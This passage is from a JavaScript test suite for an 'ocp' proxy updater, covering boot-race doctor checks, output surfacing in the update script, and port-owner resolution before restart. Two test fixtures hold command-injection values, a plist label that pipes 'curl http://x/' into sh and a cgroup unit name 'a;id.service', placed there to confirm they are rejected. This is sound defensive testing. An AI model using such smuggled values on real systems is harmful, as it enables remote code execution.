      if (cmd.includes("--user list-unit-files")) return "ocp-proxy.service enabled\n";
      if (cmd.includes("list-unit-files")) return ""; // system scope: nothing enabled
      if (cmd.includes("--user show")) return FIELD_INCIDENT_USER_SHOW;
      throw new Error("unexpected: " + cmd);
    },
  });
  assert.ok(!result.checks.some(c => c.id === "multi_unit_boot_race"));
});

test("runDoctor: zero enabled units on either scope → no check pushed, no crash", async () => {
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
    mockPlatform: "linux",
    run: (cmd) => {
      if (cmd.includes("list-unit-files")) return "";
      throw new Error("unexpected: " + cmd);
    },
  });
  assert.ok(!result.checks.some(c => c.id === "multi_unit_boot_race"));
  assert.equal(result.ready_to_upgrade, true);
});

test("MED-5: runDoctor — systemctl EXISTS but this probe fails for another reason (non-127 exit) → pushes a visible INFO line, distinguishable from a verified-clear host", async () => {
  // Before the MED-5 fix, "unknown" pushed nothing at all — indistinguishable from a genuinely
  // clear host in the JSON output. That matters because `systemctl --user ...` fails without
  // XDG_RUNTIME_DIR/DBUS_SESSION_BUS_ADDRESS, which is exactly what `sudo`'s env_reset strips —
  // so `sudo ocp update` on a host whose OCP is a SYSTEM unit (the #215 shape) silently
  // degraded this whole check with no visible trace.
  //
  // LOW-3 (review round 4): the thrown error here deliberately has NO `.status` (unlike a real
  // "command not found", which exits 127 — verified directly via execSync) — this is the
  // "systemctl is present but something else went wrong" case (permission, timeout, transient
  // error), which must still surface as INFO. The genuinely-absent case is the next test.
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
    mockPlatform: "linux",
    run: (cmd) => { throw new Error("systemctl: unexpected failure (not command-not-found)"); },
  });
  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
  assert.ok(check, "an 'unknown' verdict must still be visible in the output, not silently omitted");
  assert.equal(check.level, "INFO", "must not be WARN (no confirmed conflict) or FAIL (must never block an upgrade)");
  assert.ok(check.message.includes("could not verify"));
  assert.equal(result.ready_to_upgrade, true);
  assert.equal(result.warn_count, 0, "INFO must not be counted as a warning");
});

test("LOW-3: runDoctor — systemctl genuinely NOT INSTALLED (exit 127, verified as the real signal) → 'not-applicable', NO push at all, never repeats forever", () => {
  // The concern this fixes: on a non-systemd Linux host (container, WSL without systemd,
  // OpenRC), EVERY `ocp update` was pushing an unactionable "could not verify" INFO line,
  // forever, about a check that can never work there. Verified the real signal directly:
  // execSync on a genuinely-missing binary (given as a shell command STRING, this file's own
  // convention) exits 127 via the shell that resolves it — not a Node-level ENOENT on the
  // execSync call itself. A thrown Error with `.status = 127` is therefore the realistic
  // simulation of "systemctl isn't on this host at all", distinct from the previous test's
  // generic failure.
  const notFound = () => { const e = new Error("systemctl: command not found"); e.status = 127; throw e; };
  return runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
    mockPlatform: "linux",
    run: notFound,
  }).then((result) => {
    assert.ok(!result.checks.some(c => c.id === "multi_unit_boot_race"),
      "a genuinely-absent systemctl must push NOTHING — silent like 'clear', not a permanent unactionable INFO line on every future run");
    assert.equal(result.ready_to_upgrade, true);
  });
});

test("runDoctor: skipNetwork=true skips the probe entirely, even when the injected run() would report a conflict", () => {
  // Proves the gate: skipNetwork must short-circuit before `run` is ever consulted — a test
  // suite running with skipNetwork:true (the vast majority of this file's pre-existing doctor
  // tests) must never touch a live systemctl/launchd, matching the existing
  // service_running/oauth_ok block's own skipNetwork gate immediately above it in doctor.mjs.
  let runCalled = false;
  const result = runDoctor({
    skipNetwork: true,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockPlatform: "linux",
    run: () => { runCalled = true; return FIELD_INCIDENT_USER_SHOW; },
  });
  return result.then((r) => {
    assert.equal(runCalled, false, "run() must never be invoked when skipNetwork is true");
    assert.ok(!r.checks.some(c => c.id === "multi_unit_boot_race"));
  });
});

console.log("\nMulti-unit boot-race pre-flight (issue #220) — full pipeline via runDoctor (macOS — MED-3 blocker: previously untested):");

test("MED-3: runDoctor on darwin — WARN message uses launchctl, NEVER systemctl (systemctl does not exist on macOS)", async () => {
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456", bind: "127.0.0.1" })],
    ["/Library/LaunchDaemons/com.company.ocpd.plist", ocpPlist({ label: "com.company.ocpd", port: "3456", bind: "0.0.0.0" })],
  ]);
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
    mockPlatform: "darwin",
    run: (cmd) => {
      if (cmd.includes("for f in")) return blob;
      if (cmd.includes("print-disabled")) return disabledLaunchctlBlob([["dev.ocp.proxy", false], ["com.company.ocpd", false]]);
      throw new Error("unexpected: " + cmd);
    },
  });
  const check = result.checks.find(c => c.id === "multi_unit_boot_race");
  assert.ok(check, "expected a multi_unit_boot_race check to be pushed");
  assert.equal(check.level, "WARN");
  assert.ok(!check.message.includes("systemctl"), "must never suggest a systemctl command on macOS — that binary doesn't exist there");
  assert.ok(check.message.includes("launchctl disable"), "must suggest the real macOS remediation");
  assert.ok(check.message.includes("dev.ocp.proxy") && check.message.includes("com.company.ocpd"), "message must name both units");
});

test("MED-3: runDoctor on darwin — a maliciously-labeled plist never reaches the WARN message (would otherwise be copy-pasteable into a shell)", async () => {
  const blob = plistBlob([
    ["/Users/opc/Library/LaunchAgents/dev.ocp.proxy.plist", ocpPlist({ label: "dev.ocp.proxy", port: "3456" })],
    ["/Library/LaunchDaemons/evil.plist", ocpPlist({ label: 'evil"; curl http://x/|sh #', port: "3456" })],
  ]);
  const result = await runDoctor({
    skipNetwork: false,
    mockVersion: "v3.26.0",
    mockLatest: "v3.26.0",
    mockHealth: { status: 200, body: { version: "3.26.0", auth: { ok: true } } },
    mockPlatform: "darwin",
    run: (cmd) => {
      if (cmd.includes("for f in")) return blob;
      if (cmd.includes("print-disabled")) return disabledLaunchctlBlob([["dev.ocp.proxy", false]]);
      throw new Error("unexpected: " + cmd);
    },
  });
  // Only ONE valid unit remains once the malformed Label is rejected → clear, no WARN at all,
  // so the dangerous string can never appear in doctor's output at all.
  assert.ok(!result.checks.some(c => c.id === "multi_unit_boot_race"));
});

console.log("\nocp `cmd_update` doctor-check surfacing (issue #220, MED-5 recurrence):");

// #230 review (round 3): doctor.mjs's multi_unit_boot_race INFO line reached `ocp doctor`
// (which prints every check regardless of level — see doctor.mjs's text-mode printer) but
// never `ocp update`'s OWN doctor-check-surfacing block (`ocp`, ~:800-816), which filtered on
// WARN only — the exact #214 discarded-check shape recurring one level up, on the very fix
// meant to make "unknown" visible.
//
// This slices and execs the REAL bash-embedded python block — same anchor-slice technique as
// the ocp-connect harnesses above (#210/#218) — rather than reimplementing the filter or
// grepping for a string, so a regression in the ACTUAL logic fails this test, not a copy of it.
//
// Unlike ocp-connect's harnesses (whose python block lives in a QUOTED heredoc <<'PYEOF' and
// therefore needs no unescaping at all), this block lives inside a bash DOUBLE-QUOTED
// `python3 -c "..."` argument, so literal `"` characters in the source are backslash-escaped
// (`\"`) — bash unescapes them before python3 ever sees the argument. Reversing that
// (`blk.replace('\\"', '"')`, inside the slice itself) is what makes the slice valid, runnable
// python matching what bash ACTUALLY executes at runtime, not a JS reconstruction of it.
const _OCP_CHECK_SURFACE_PY = `
import json, sys
src = open(sys.argv[1]).read()
start_marker = "for c in d.get('checks', []):"
end_marker = "\\n\\" 2>/dev/null"
si = src.index(start_marker)
ei = src.index(end_marker, si)
blk = src[si:ei]
assert blk.strip(), "empty doctor-check-surfacing slice - anchor drift"
assert "'WARN'" in blk and "'INFO'" in blk, "slice missing WARN/INFO handling - anchor drift"
assert 'case "$kind"' not in blk and '_cmd_update_restart' not in blk, \\
    "slice overgrown past the intended block - anchor drift"
# Review round 4 on #230 (LOW-1): bash's double-quoted-string escaping unescapes FOUR forms
# (\\", \\\\, \\$, \\\`) plus a backslash-newline line continuation - this block currently uses
# ONLY \\", so a blanket blk.replace('\\"', '"') is exact TODAY. If a future edit introduces any
# of the other forms, this harness and real bash would silently diverge (a literal backslash
# would leak into the "python" this harness execs, or a variable would get mangled) - assert
# BEFORE the replace that every single backslash in the raw slice is part of a \\" pair, so that
# drift fails loudly here instead of silently testing something bash would never actually run.
for i, ch in enumerate(blk):
    if ch == '\\\\' and (i + 1 >= len(blk) or blk[i + 1] != '"'):
        raise AssertionError("slice contains a bash escape form other than \\\\\\" (\\\\\\\\, \\\\$, backtick, or line-continuation) - the blanket unescape below no longer matches what bash actually produces at runtime; update it")
blk = blk.replace('\\\\"', '"')
d = json.loads(sys.argv[2])
exec(blk)
`;

function _ocpSurfaceChecks(checks) {
  return execFileSync(
    "python3",
    ["-c", _OCP_CHECK_SURFACE_PY, join(_spotDir, "ocp"), JSON.stringify({ checks })],
    { encoding: "utf8" },
  );
}

test("ocp cmd_update's real doctor-check-surfacing block: WARN is surfaced (pre-existing #214 behavior, preserved)", () => {
  const out = _ocpSurfaceChecks([{ level: "WARN", message: "tree at X, service serving Y — restarting" }]);
  assert.ok(out.includes("tree at X, service serving Y — restarting"));
  assert.ok(out.startsWith("⚠"));
});

test("MED-5 recurrence fix: ocp cmd_update's real doctor-check-surfacing block now ALSO surfaces INFO, not just WARN", () => {
  const out = _ocpSurfaceChecks([{ level: "INFO", message: "could not verify: systemctl unavailable" }]);
  assert.ok(out.includes("could not verify: systemctl unavailable"),
    "an INFO-level check (e.g. multi_unit_boot_race's 'could not verify' line) must reach `ocp update`'s output, not just `ocp doctor`'s");
  assert.ok(out.startsWith("ℹ"), "INFO gets its own glyph, distinct from WARN's ⚠");
});

test("ocp cmd_update's real doctor-check-surfacing block: PASS/FAIL are still NOT printed (this block is for actionable WARN/INFO only)", () => {
  const out = _ocpSurfaceChecks([
    { level: "PASS", message: "service responding on /health" },
    { level: "FAIL", message: "some fail" },
  ]);
  assert.equal(out, "", "PASS/FAIL checks must not be echoed by this block — the case-statement dispatch right after already handles FAIL/kind; this block is only for WARN/INFO context lines");
});

test("ocp cmd_update's real doctor-check-surfacing block: WARN and INFO both print together, in checks order, skipping PASS in between", () => {
  const out = _ocpSurfaceChecks([
    { level: "WARN", message: "warn one" },
    { level: "PASS", message: "pass one" },
    { level: "INFO", message: "info one" },
  ]);
  assert.equal(out, "⚠ warn one\nℹ info one\n");
});

test("LOW-2 (real shell, verified mechanism): ocp's doctor-check-surfacing block survives a stdout encoding that can't represent the WARN/INFO glyphs — set -e must not kill cmd_update silently", () => {
  // The actual bug found on review round 4: under `set -euo pipefail` (ocp:7), a non-zero exit
  // from this python pipeline kills `cmd_update` immediately, and `2>/dev/null` hides why.
  // Verified directly before this fix (originally via `env -i LC_ALL=C`, an ASCII-only C
  // locale): a UnicodeEncodeError printing "⚠"/"ℹ" exits 1 before even reaching the kind
  // dispatch below it — silently aborting the whole update. This PR's own INFO addition made
  // the block fire far more often (it used to print nothing on most healthy hosts). Reproduced
  // against the REAL, current `ocp` file (not a hand-copied snippet): extract the actual
  // doctor-check-surfacing if-block, wrap it in a minimal harness script, and run it under an
  // environment that can't encode the glyphs.
  //
  // PYTHONIOENCODING=ascii (rather than forcing LC_ALL=C or using `env -i`) is the portable
  // choice: it directly controls Python's own stdout encoder on every platform uniformly,
  // whereas locale-based reproduction depends on the OS's installed locale data/libc, which
  // this repo's own CI caught diverging — `env -i` additionally stripped PATH, breaking
  // bash/python3 lookup on that Linux runner (a portability false failure, not the bug under
  // test); a PATH-preserving `LC_ALL=C` override then still behaved differently under this
  // repo's Linux CI than on the macOS dev machine it was authored on. PYTHONIOENCODING is
  // read directly by CPython's IO layer regardless of OS locale, so it reproduces identically
  // on both. Verified both directions before switching: throws pre-fix (reconfigure stripped),
  // passes post-fix.
  const src = spotReadFileSync(join(_spotDir, "ocp"), "utf8");
  const startMarker = '  if [[ -n "$doctor_json" ]]; then';
  const endMarker = "\n  fi";
  const si = src.indexOf(startMarker);
  assert.ok(si !== -1, "anchor drift: could not find the doctor-check-surfacing if-block start");
  const ei = src.indexOf(endMarker, si);
  assert.ok(ei !== -1 && ei > si, "anchor drift: could not find the doctor-check-surfacing if-block end");
  const block = src.slice(si, ei + endMarker.length);
  assert.ok(block.includes("reconfigure"), "anchor drift: extracted block is missing the errors=\"replace\" fix entirely");

  const scratch = mkdtempSync(join(tmpdir(), "ocp-low2-test-"));
  try {
    const scriptPath = join(scratch, "repro.sh");
    writeFileSync(scriptPath, [
      "#!/bin/bash",
      "set -euo pipefail",
      `doctor_json='{"checks":[{"level":"WARN","message":"warn msg"},{"level":"INFO","message":"info msg"}]}'`,
      block,
      'echo "REACHED_AFTER_BLOCK"',
      "",
    ].join("\n"));
    const childEnv = { ...process.env, PYTHONIOENCODING: "ascii" };
    const out = execFileSync("bash", [scriptPath], { encoding: "utf8", env: childEnv });
    assert.ok(out.includes("REACHED_AFTER_BLOCK"),
      "cmd_update must survive past this block even when stdout can't encode the glyphs — set -e must not silently kill it");
      // Surviving is not enough: errors="replace" must DEGRADE the output (glyph -> "?"), not
      // swallow it. Without this a "fix" that emitted nothing would pass. It also stops the test
      // going silently vacuous if the fixture ever gains a non-ASCII character: PYTHONIOENCODING
      // =ascii is stricter on stdin than any real locale, so json.load() would raise, the
      // pre-existing `except Exception: sys.exit(0)` would swallow it, and REACHED_AFTER_BLOCK
      // would still print with nothing proven. (#230 review round 4.)
      assert.ok(out.includes("warn msg") && out.includes("info msg"),
        "the messages must still be printed, degraded — surviving while emitting nothing is not the fix");
  } finally {
    rmSync(scratch, { recursive: true, force: true });
  }
});

// ═══════════════════════════════════════════════════════════════════════════
// ── Restart-unit resolution (issue #215) ──
// New section — kept self-contained (own imports, own console.log header) so a
// rebase against concurrent test-features.mjs PRs is a clean insert.
//
// Background: `ocp update`'s restart phase hard-coded a unit name
// (`ocp-proxy.service` / `dev.ocp.proxy`) regardless of what actually held the
// port. On a real host the listener was owned by a SYSTEM systemd unit while a
// separate, also-enabled USER unit existed with different config; the update
// "restarted" the user unit, which spawned a second server.mjs that could not
// bind the already-held port, and the orphan was left running while the host
// kept serving the old version. See scripts/lib/restart-unit.mjs and the two
// restart call sites in scripts/upgrade.mjs (runFullUpgrade phase 5, runRollback).
//
// Independent review of the first version of this fix (PR #221) found the
// module resolved every AMBIGUOUS case into a wrong CONFIDENT answer instead of
// an honest "unknown", which matters because "unknown" must never be treated as
// safe-to-guess. This revision closes those findings; each test below that
// exists BECAUSE of the review says so in its name (HIGH-1, MED-3, MED-4, MED-5,
// MED-6, MED-7, MED-8).
//
// Every test here is BEHAVIORAL: it calls the exported resolver/planner
// functions (or runUpgrade with injected mocks / an injected command runner)
// and asserts on return values or thrown messages — never on scripts/
// upgrade.mjs's or scripts/lib/restart-unit.mjs's source text.
// ═══════════════════════════════════════════════════════════════════════════
import { resolveOwningUnit, planRestart, classifySsListener, classifyLsofListener, parseCgroupUnit, classifyCmdlineOwner, classifyLaunchdJob, classifyLaunchdArgv } from "./scripts/lib/restart-unit.mjs";

console.log("\nRestart-unit resolution (issue #215) — classifiers:");

// ── classifySsListener / classifyLsofListener: three-valued (HIGH-1) ──

test("classifySsListener: single clean LISTEN row → listening(pid)", () => {
  const ss = `State  Recv-Q Send-Q  Local Address:Port   Peer Address:Port  Process\nLISTEN 0      511          0.0.0.0:3456        0.0.0.0:*     users:(("node",pid=798931,fd=19))`;
  assert.deepEqual(classifySsListener(ss), { state: "listening", pid: "798931", reason: null });
});

test("classifySsListener: no LISTEN row at all → not-listening (never confused with unknown)", () => {
  assert.deepEqual(classifySsListener(""), { state: "not-listening", pid: null, reason: null });
  assert.equal(classifySsListener("State  Recv-Q Send-Q  Local Address:Port   Peer Address:Port  Process\n").state, "not-listening");
});

test("HIGH-1: classifySsListener never runs (null) → unknown, NOT not-listening", () => {
  // The defect: the old code treated "tool didn't run" and "confirmed empty" identically,
  // which silently re-ran the pre-#215 default command and reported SUCCESS.
  const result = classifySsListener(null);
  assert.equal(result.state, "unknown");
  assert.notEqual(result.state, "not-listening");
});

test("HIGH-1: classifySsListener — a LISTEN row with NO owning PID (foreign-uid process) → unknown", () => {
  // Live-verified repro from the review: `ss -lptn`'s `users:(())` PID column is omitted
  // ENTIRELY (not printed empty — absent) when the caller cannot see the target's /proc/*/fd,
  // which is exactly what happens when a non-root updater probes a root-owned system unit
  // (the default for `User=` unset). This is the actual #215-shaped failure mode: it does not
  // currently bite this fleet (system units here run as the same user as the updater) but
  // bites the moment anyone runs OCP as root.
  const ss = "LISTEN 0 100  172.16.2.231:40065  0.0.0.0:*";
  const result = classifySsListener(ss);
  assert.equal(result.state, "unknown");
  assert.equal(result.pid, null);
  assert.ok(/different user|privileges/.test(result.reason), `reason should explain the privilege gap; got: ${result.reason}`);
});

test("classifySsListener: two distinct PIDs answering the same port (dual-stack/SO_REUSEPORT) → unknown, not an arbitrary pick", () => {
  // "which of several listeners" is issue #215's own diagnostic question — picking the first
  // pid= found anywhere in the blob (the pre-review implementation) answered it by coin flip.
  const ss = `LISTEN 0 511 0.0.0.0:3456 0.0.0.0:* users:(("node",pid=100,fd=3))\nLISTEN 0 511 [::]:3456 [::]:* users:(("node",pid=200,fd=4))`;
  const result = classifySsListener(ss);
  assert.equal(result.state, "unknown");
  assert.ok(result.reason.includes("100") && result.reason.includes("200"));
});

test("classifyLsofListener: single row → listening(pid), skips the header", () => {
  const lsof = `COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nnode    12345 opc   23u  IPv6 0x1234      0t0  TCP *:3456 (LISTEN)`;
  assert.deepEqual(classifyLsofListener(lsof), { state: "listening", pid: "12345", reason: null });
});

test("classifyLsofListener: empty output → not-listening; null (tool didn't run) → unknown", () => {
  assert.equal(classifyLsofListener("").state, "not-listening");
  assert.equal(classifyLsofListener(null).state, "unknown");
});

// ── parseCgroupUnit: leaf→root walk, multi-line fallback, unreadable ≠ no-unit (MED-3) ──

test("parseCgroupUnit: default system.slice-nested unit resolves", () => {
  assert.deepEqual(parseCgroupUnit("0::/system.slice/ocp.service\n"),
    { state: "resolved", scope: "system", unit: "ocp.service", reason: null });
});

test("MED-3: parseCgroupUnit resolves a custom top-level Slice= (no literal \"system.slice\" segment at all)", () => {
  // Review's own repro table: "0::/ocp.slice/ocp.service" previously hard-ABORTED with a false
  // "not managed by any systemd unit" diagnosis, because scope detection required the literal
  // substring "/system.slice/". A custom Slice=ocp.slice for a SYSTEM unit has no such segment.
  const result = parseCgroupUnit("0::/ocp.slice/ocp.service\n");
  assert.equal(result.state, "resolved");
  assert.equal(result.scope, "system");
  assert.equal(result.unit, "ocp.service");
});

test("MED-3: parseCgroupUnit resolves a Delegate=yes payload scope by walking UP to the owning .service", () => {
  // The process's own cgroup is legitimately nested BELOW the unit for Delegate=yes units —
  // the leaf segment ("payload.scope") is not the unit. Leaf-only (pre-review) hard-aborted.
  const result = parseCgroupUnit("0::/system.slice/ocp.service/payload.scope\n");
  assert.equal(result.state, "resolved");
  assert.equal(result.unit, "ocp.service");
});

test("MED-3: parseCgroupUnit's cgroup-v1 fallback is REACHABLE even when a 0::/ line is present but uninformative", () => {
  // Pre-review: the function picked the "0::" line whenever it EXISTED, full stop — so the
  // advertised v1 "name=systemd" fallback was dead code any time a 0::/ line existed at all,
  // even a bare "0::/" that resolves to nothing. Every candidate line must be tried.
  const result = parseCgroupUnit("1:name=systemd:/system.slice/ocp.service\n0::/\n");
  assert.equal(result.state, "resolved");
  assert.equal(result.unit, "ocp.service");
});

test("parseCgroupUnit still avoids the user@<uid>.service trap (regression guard, pre-existing coverage)", () => {
  const cgroup = "0::/user.slice/user-1000.slice/user@1000.service/app.slice/ocp-proxy.service\n";
  assert.deepEqual(parseCgroupUnit(cgroup), { state: "resolved", scope: "user", unit: "ocp-proxy.service", reason: null });
});

test("parseCgroupUnit: genuinely bare process (session scope, no .service anywhere) → no-unit", () => {
  const cgroup = "0::/user.slice/user-1000.slice/user@1000.service/session.slice/session-3.scope\n";
  const result = parseCgroupUnit(cgroup);
  assert.equal(result.state, "no-unit");
});

test("MED-3: parseCgroupUnit — UNREADABLE cgroup (null) is 'unknown', never the false-confident 'no-unit'", () => {
  // The defect: null used to be treated identically to "read fine, found nothing", which then
  // hard-threw claiming the PID "is not managed by any systemd unit" — a diagnosis the code
  // has no actual evidence for. Permission-denied (hidepid=2) and a PID that exited between
  // the ss/lsof probe and this read both look like this.
  const result = parseCgroupUnit(null);
  assert.equal(result.state, "unknown");
  assert.notEqual(result.state, "no-unit");
});

test("MED-3: parseCgroupUnit — empty-string cgroup read is also 'unknown', not 'no-unit'", () => {
  assert.equal(parseCgroupUnit("").state, "unknown");
});

test("MED-5: parseCgroupUnit rejects a semicolon-injected unit segment — never becomes a restart target", () => {
  // Exact PoC from the review: a cgroup v2 delegated directory name is attacker-creatable, and
  // this segment would otherwise be concatenated straight into `sh -c`.
  const cgroup = "0::/user.slice/user-1000.slice/user@1000.service/app.slice/a;id.service\n";
  const result = parseCgroupUnit(cgroup);
  assert.notEqual(result.state, "resolved", "an unvalidated unit name must never resolve");
  assert.equal(result.unit, null);
});

test("MED-5: parseCgroupUnit rejects a space-containing unit segment (word-splits into multiple systemctl args otherwise)", () => {
  const cgroup = "0::/system.slice/a b c.service\n";
  const result = parseCgroupUnit(cgroup);
  assert.notEqual(result.state, "resolved");
  assert.equal(result.unit, null);
});

console.log("\nRestart-unit resolution (issue #237) — classifyCmdlineOwner:");

// issue #237: a well-formed, real systemd unit name is not proof the process behind it is OCP's
// own server.mjs — parseCgroupUnit resolving "nginx.service" tells you WHICH unit owns the port,
// never WHETHER that unit is ours. classifyCmdlineOwner reads the SAME PID's /proc/<pid>/cmdline
// (NUL-separated argv) and answers exactly that, mirroring doctor.mjs's #230
// fingerprintSystemdUnit's own serverArg check (`a === "server.mjs" || a.endsWith("/server.mjs")`)
// so "doctor.mjs would call this an OCP unit" and "this resolver treats it as a restart candidate"
// are the same test, not two that can drift apart.

test("classifyCmdlineOwner: argv invokes server.mjs directly → ocp", () => {
  const cmdline = "node\0server.mjs\0--port\0" + "3456" + "\0";
  assert.deepEqual(classifyCmdlineOwner(cmdline), { state: "ocp", reason: null });
});

test("classifyCmdlineOwner: argv invokes an absolute path ending in /server.mjs → ocp", () => {
  const cmdline = "/usr/bin/node\0/home/opc/ocp/server.mjs\0";
  assert.deepEqual(classifyCmdlineOwner(cmdline), { state: "ocp", reason: null });
});

test("classifyCmdlineOwner: nginx's real cmdline (no server.mjs anywhere) → foreign, names the argv in the reason", () => {
  // The literal issue #237 scenario: CLAUDE_PROXY_PORT misconfigured onto a port nginx already
  // holds. nginx is a real, systemd-managed unit — parseCgroupUnit resolves it cleanly to
  // "nginx.service" — but its process is definitely not OCP.
  const cmdline = "nginx: master process /usr/sbin/nginx -g daemon off;\0";
  const result = classifyCmdlineOwner(cmdline);
  assert.equal(result.state, "foreign");
  assert.ok(result.reason.includes("does not invoke server.mjs"));
  assert.ok(result.reason.includes("nginx"), `reason should name the actual argv; got: ${result.reason}`);
});

test("classifyCmdlineOwner: NUL is the argv separator, not a space — a path containing a literal space is not two tokens", () => {
  // /proc/<pid>/cmdline is NUL-separated; naively splitting on whitespace would tear
  // "/opt/my ocp/server.mjs" into two tokens, neither of which ends in "/server.mjs" as typed.
  const cmdline = "/usr/bin/node\0/opt/my ocp/server.mjs\0";
  assert.deepEqual(classifyCmdlineOwner(cmdline), { state: "ocp", reason: null });
});

test("classifyCmdlineOwner: unreadable cmdline (null) → unknown, never the false-confident 'foreign'", () => {
  // Same "unknown must never be treated as safe-to-guess" posture as parseCgroupUnit's own
  // null-handling: permission denied (hidepid=2, a non-root updater against a root-owned PID) or
  // the PID exiting between the cgroup read and this one both look like this. A false "definitely
  // NOT OCP" diagnosis on a process we simply could not inspect would be exactly the
  // wrong-but-confident answer every classifier in this file exists to eliminate.
  const result = classifyCmdlineOwner(null);
  assert.equal(result.state, "unknown");
  assert.notEqual(result.state, "foreign");
});

test("classifyCmdlineOwner: empty-string cmdline read is also 'unknown', not 'foreign'", () => {
  assert.equal(classifyCmdlineOwner("").state, "unknown");
});

console.log("\nRestart-unit resolution (issue #239) — classifyLaunchdJob:");

// issue #239: macOS has no /proc/<pid>/cgroup reverse lookup, so ownership resolution runs the
// OTHER direction from Linux — ask launchd what pid IT believes owns the ONE label this repo
// manages, via `launchctl print gui/<uid>/dev.ocp.proxy`. classifyLaunchdJob is the pure
// classifier for that command's raw stdout, mirroring parseCgroupUnit's role on the Linux side.
// Fixture shapes below are taken from a live capture against the real dev.ocp.proxy job (see this
// function's own comment in scripts/lib/restart-unit.mjs) and from the live "Could not find
// service" probe against a deliberately nonexistent label.

const LAUNCHCTL_PRINT_LIVE_SAMPLE =
  "gui/501/dev.ocp.proxy = {\n" +
  "\tactive count = 1\n" +
  "\tpath = /Users/tester/Library/LaunchAgents/dev.ocp.proxy.plist\n" +
  "\ttype = LaunchAgent\n" +
  "\tstate = running\n\n" +
  "\tprogram = /opt/homebrew/Cellar/node/26.5.0/bin/node\n" +
  "\targuments = {\n" +
  "\t\t/opt/homebrew/Cellar/node/26.5.0/bin/node\n" +
  "\t\t/Users/tester/ocp/server.mjs\n" +
  "\t}\n\n" +
  "\tdomain = gui/501 [100018]\n" +
  "\tpid = 55416\n" +
  "\tlast exit code = (never exited)\n" +
  "}";

test("classifyLaunchdJob: full live-shaped capture (registered + running) → running, correct pid and argv", () => {
  const result = classifyLaunchdJob(LAUNCHCTL_PRINT_LIVE_SAMPLE);
  assert.equal(result.state, "running");
  assert.equal(result.pid, "55416");
  assert.deepEqual(result.argv, ["/opt/homebrew/Cellar/node/26.5.0/bin/node", "/Users/tester/ocp/server.mjs"]);
});

test("classifyLaunchdJob: not-registered — the gather layer's sentinel for launchctl's \"Could not find service\" failure is an EMPTY string, not null", () => {
  // scripts/upgrade.mjs's mapLaunchctlPrintFailureToProbeValue turns the live "Could not find
  // service ..." nonzero-exit failure into "" — this function's job is just to classify that
  // sentinel correctly, not to talk to launchctl itself.
  assert.deepEqual(classifyLaunchdJob(""), { state: "not-registered", pid: null, argv: null, reason: null });
  assert.equal(classifyLaunchdJob("   \n").state, "not-registered", "whitespace-only output must also count as empty");
});

test("classifyLaunchdJob: registered but NOT running — no \"pid = \" line anywhere in a non-empty blob → not-running", () => {
  const blob = "gui/501/dev.ocp.proxy = {\n\tstate = not running\n\tpath = /Users/tester/Library/LaunchAgents/dev.ocp.proxy.plist\n}";
  const result = classifyLaunchdJob(blob);
  assert.equal(result.state, "not-running");
  assert.equal(result.pid, null);
});

test("classifyLaunchdJob: printOutput === null (probe didn't run / failed some other way) → unknown, never a false 'not-registered'", () => {
  // Same "unknown must never be treated as safe-to-guess" posture as every other classifier in
  // this file: null means genuinely couldn't tell, distinct from "" (a string, positively
  // confirmed empty by the gather layer's specific "Could not find service" mapping).
  const result = classifyLaunchdJob(null);
  assert.equal(result.state, "unknown");
  assert.notEqual(result.state, "not-registered");
  assert.ok(result.reason);
});

console.log("\nRestart-unit resolution (issue #239) — classifyLaunchdArgv:");

// issue #239 (mirroring #237): classifyLaunchdJob answers "is a process running under the label,
// and what pid/argv does launchd say it has" — never "does that argv actually invoke server.mjs".
// classifyLaunchdArgv closes that gap using the EXACT SAME predicate classifyCmdlineOwner uses on
// Linux (findServerMjsArg) — reused, not reimplemented.

test("classifyLaunchdArgv: argv invokes server.mjs directly → ocp", () => {
  assert.deepEqual(classifyLaunchdArgv(["node", "server.mjs"]), { state: "ocp", reason: null });
});

test("classifyLaunchdArgv: argv invokes an absolute path ending in /server.mjs → ocp", () => {
  assert.deepEqual(classifyLaunchdArgv(["/opt/homebrew/bin/node", "/Users/tester/ocp/server.mjs"]), { state: "ocp", reason: null });
});

test("classifyLaunchdArgv: a hand-edited/hijacked label running a DIFFERENT program → foreign, names the argv in the reason", () => {
  // The macOS analogue of #237's nginx scenario: the dev.ocp.proxy LABEL is registered and
  // running, its pid matches the port's holder, but its ProgramArguments were changed (by hand,
  // or by a compromised installer) to launch something that isn't server.mjs at all.
  const result = classifyLaunchdArgv(["/usr/bin/python3", "/opt/some-other-daemon/main.py"]);
  assert.equal(result.state, "foreign");
  assert.ok(result.reason.includes("does not invoke server.mjs"));
  assert.ok(result.reason.includes("main.py"), `reason should name the actual argv; got: ${result.reason}`);
});

test("classifyLaunchdArgv: empty or non-array argv → foreign, never throws", () => {
  assert.equal(classifyLaunchdArgv([]).state, "foreign");
  assert.equal(classifyLaunchdArgv(null).state, "foreign");
  assert.equal(classifyLaunchdArgv(undefined).state, "foreign");
});

console.log("\nRestart-unit resolution (issue #237) — resolveOwningUnit + planRestart refuse a FOREIGN process holding the port:");

test("resolveOwningUnit: a real systemd unit (nginx.service) whose process is confirmed NOT server.mjs resolves to 'foreign-process', not 'system-unit'", () => {
  const owner = resolveOwningUnit({
    platform: "linux",
    expectedUnit: "ocp-proxy.service",
    ssOutput: `LISTEN 0 511 0.0.0.0:80 0.0.0.0:* users:(("nginx",pid=445001,fd=6))`,
    cgroupContent: "0::/system.slice/nginx.service\n",
    cmdlineContent: "nginx: master process /usr/sbin/nginx -g daemon off;\0",
  });
  assert.equal(owner.kind, "foreign-process");
  assert.equal(owner.unit, "nginx.service");
  assert.equal(owner.pid, "445001");
  assert.ok(owner.reason.includes("nginx.service"));
});

